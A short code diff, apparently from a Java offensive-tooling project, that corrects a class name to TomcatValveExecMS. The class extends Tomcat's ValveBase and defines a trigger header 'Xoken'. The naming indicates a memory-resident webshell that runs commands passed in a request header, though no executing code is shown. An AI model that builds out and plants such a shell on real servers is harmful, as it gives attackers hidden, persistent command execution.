@@ -13,7 +13,7 @@ import java.lang.reflect.Method;
 /**
  * @author Whoopsunix
  */
-public class TomcatValueExecMS extends ValveBase {
+public class TomcatValveExecMS extends ValveBase {
 
     private static String HEADER = "Xoken";
 
